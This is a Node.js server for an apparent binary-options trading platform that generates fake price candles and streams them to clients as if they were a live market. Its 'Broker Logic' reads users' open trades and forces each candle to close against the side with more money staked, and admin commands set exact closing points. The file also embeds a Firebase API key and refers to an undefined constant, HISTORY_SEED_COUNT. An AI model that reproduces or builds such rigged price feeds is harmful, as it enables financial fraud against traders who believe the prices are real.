const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 300; 
const TIMEFRAME = 60000; 
const TICK_MS = 200;
const MIN_PRICE = 0.00001;

const markets = {}; 
let adminCommands = {}; 
let activeTradesData = {}; // Store active trades to calculate UP/DOWN volume

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// 1. Fetch Admin Commands
db.ref('admin/commands').on('value', (snapshot) => {
    adminCommands = snapshot.val() || {};
});

// 2. Fetch Active Trades (For Auto Logic)
db.ref('admin/markets').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    activeTradesData = {};
    Object.keys(data).forEach(marketId => {
        activeTradesData[marketId] = data[marketId].activeTrades || {};
    });
});

// API for Client App
app.get('/api/history/:market', (req, res) => {
    const marketId = req.params.market;
    if (markets[marketId]) res.json(markets[marketId].history);
    else res.json([]);
});

// 🔥 PRECISE EXACT POINT GENERATOR + AUTO LOGIC 🔥
function generateTargetCandle(timestamp, openPrice, marketId, actionStr) {
    let targetClose;
    let isGreen;
    
    // Check if Admin gave a POINT command (e.g. "+36" or "-25")
    if (actionStr && !isNaN(parseInt(actionStr))) {
        const points = parseInt(actionStr);
        const pointValue = points * 0.00001; // 1 Point = 0.00001
        
        targetClose = openPrice + pointValue;
        isGreen = targetClose >= openPrice;
    } 
    // AUTO LOGIC (If no admin command)
    else {
        let upVolume = 0;
        let dnVolume = 0;
        
        // Calculate volume for trades expiring in this minute
        const trades = activeTradesData[marketId] || {};
        const expiryTime = timestamp + 60000; 

        Object.values(trades).forEach(trade => {
            // Check if trade belongs to this candle
            if (trade.timestamp && (trade.timestamp + 60000) === expiryTime) {
                if (trade.direction === 'UP') upVolume += parseFloat(trade.amount);
                if (trade.direction === 'DOWN') dnVolume += parseFloat(trade.amount);
            }
        });

        // Broker Logic: Make the majority lose
        if (upVolume > dnVolume) {
            isGreen = false; // Force Red
        } else if (dnVolume > upVolume) {
            isGreen = true; // Force Green
        } else {
            isGreen = Math.random() > 0.5; // Random if no trades or equal
        }

        // Generate normal body size for auto mode
        const baseVol = openPrice * 0.00006;
        const bodySize = baseVol * (0.5 + Math.random());
        targetClose = isGreen ? openPrice + bodySize : openPrice - bodySize;
    }

    targetClose = roundPrice(targetClose);

    // Generate Wicks (High/Low) naturally around Open and Close
    const wickMax = Math.abs(targetClose - openPrice) * 0.5;
    const high = roundPrice(Math.max(openPrice, targetClose) + (Math.random() * wickMax));
    const low = roundPrice(Math.min(openPrice, targetClose) - (Math.random() * wickMax));

    return { timestamp, open: roundPrice(openPrice), close: targetClose, high, low, color: isGreen ? 'GREEN' : 'RED', pattern: actionStr || 'AUTO' };
}

// Initialize Market (Starts from exact last price)
async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15000;
    
    try {
        const snap = await db.ref(`markets/${path}/live`).once('value');
        if (snap.exists() && snap.val().price) startPrice = snap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentOpen = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const target = generateTargetCandle(nowPeriod - (i * TIMEFRAME), currentOpen, marketId, null);
        candles.push({ timestamp: target.timestamp, open: target.open, high: target.high, low: target.low, close: target.close });
        currentOpen = target.close; // Next open is previous close
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        liveCandle: null,
        targetPattern: null,
        activeCommand: null,
        noise: 0
    };
    console.log(`Market Initialized: ${marketId} | Starting Price: ${startPrice}`);
}

function processMarketTick(marketData, currentPeriod) {
    const now = Date.now();
    
    // 1. MINUTE CHANGED: Setup new candle
    if (!marketData.liveCandle || marketData.liveCandle.timestamp !== currentPeriod) {
        
        // Finish old candle
        if (marketData.liveCandle) {
            const finishedCandle = { ...marketData.liveCandle };
            marketData.history.push(finishedCandle);
            if (marketData.history.length > MAX_CANDLES) marketData.history.shift();

            // Update Admin Command Status
            if (marketData.activeCommand) {
                const cmd = marketData.activeCommand;
                const resultColor = finishedCandle.close >= finishedCandle.open ? 'GREEN' : 'RED';
                db.ref(`admin/commands/${cmd.id}`).update({
                    status: 'Executed',
                    analytics: {
                        resultCandle: { 
                            open: finishedCandle.open, high: finishedCandle.high, 
                            low: finishedCandle.low, close: finishedCandle.close, 
                            color: resultColor, points: cmd.action 
                        },
                        executedAt: Date.now()
                    }
                });
            }
        }

        // Fetch Next Pending Command
        let nextCmd = null;
        let pendingCmds = Object.values(adminCommands).filter(c => c.marketId === marketData.marketId && c.status === 'Pending');
        if (pendingCmds.length > 0) {
            pendingCmds.sort((a, b) => a.createdAt - b.createdAt);
            nextCmd = pendingCmds[0];
            db.ref(`admin/commands/${nextCmd.id}`).update({ status: 'Running', executedAt: currentPeriod });
        }
        marketData.activeCommand = nextCmd;

        // Generate Target for New Minute
        const prevCandle = marketData.history[marketData.history.length - 1];
        const openPrice = prevCandle ? prevCandle.close : 1.15000;
        
        const target = generateTargetCandle(currentPeriod, openPrice, marketData.marketId, nextCmd?.action);
        marketData.targetPattern = target;

        marketData.liveCandle = { timestamp: currentPeriod, open: target.open, high: target.open, low: target.open, close: target.open };
        marketData.noise = 0;
        marketData.hitHigh = false;
        marketData.hitLow = false;
    }

    // 2. ANIMATE LIVE CANDLE
    const target = marketData.targetPattern;
    const live = marketData.liveCandle;
    const timeElapsed = now - currentPeriod;
    const progress = Math.min(timeElapsed / 60000, 1.0); 

    const expectedBasePath = target.open + ((target.close - target.open) * progress);
    const noiseMax = Math.abs(target.close - target.open) * 0.20 * (1 - progress); 
    
    marketData.noise += (Math.random() - 0.5) * noiseMax;
    if (Math.abs(marketData.noise) > noiseMax) marketData.noise *= 0.5;

    let newPrice = expectedBasePath + marketData.noise;

    if (progress > 0.2 && progress < 0.8) {
        if (!marketData.hitHigh && Math.random() < 0.05) { newPrice = target.high; marketData.hitHigh = true; } 
        else if (!marketData.hitLow && Math.random() < 0.05) { newPrice = target.low; marketData.hitLow = true; }
    }

    // Exact SNAP at the end of the minute
    if (progress >= 0.96) newPrice = target.close;

    live.close = roundPrice(newPrice);
    live.high = roundPrice(Math.max(live.high, live.close, newPrice));
    live.low = roundPrice(Math.min(live.low, live.close, newPrice));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        processMarketTick(markets[marketId], currentPeriod);
        broadcastCandle(marketId, markets[marketId].liveCandle);
    }

    // Save Live Price to Firebase (For safe restart)
    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.liveCandle) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.liveCandle.close, timestamp: m.liveCandle.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Point-Based Auto Server Running'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));